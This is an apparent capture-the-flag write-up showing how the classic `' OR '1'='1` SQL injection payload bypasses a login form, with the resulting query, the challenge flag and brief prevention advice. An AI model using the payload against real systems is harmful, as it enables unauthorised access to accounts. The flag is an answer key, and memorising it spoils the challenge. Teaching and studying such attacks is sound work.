# SQL Injection Spaghetti - Writeup

## Challenge Description
This login form is a mess. Can you bypass it?

## Solution

The login form is vulnerable to SQL injection. The backend doesn't properly escape user input.

### Attack Vector
```sql
' OR '1'='1
```

**Username:** `admin`
**Password:** `' OR '1'='1`

This bypasses the authentication check because the SQL query becomes:
```sql
SELECT * FROM users WHERE username='admin' AND password='' OR '1'='1'
```

Since `'1'='1'` is always true, authentication succeeds.

## Flag
`MCTF{SQL_INJECTION_BYPASS_SUCCESS}`

## Prevention
- Use prepared statements/parameterized queries
- Input validation and sanitization
- Principle of least privilege for database users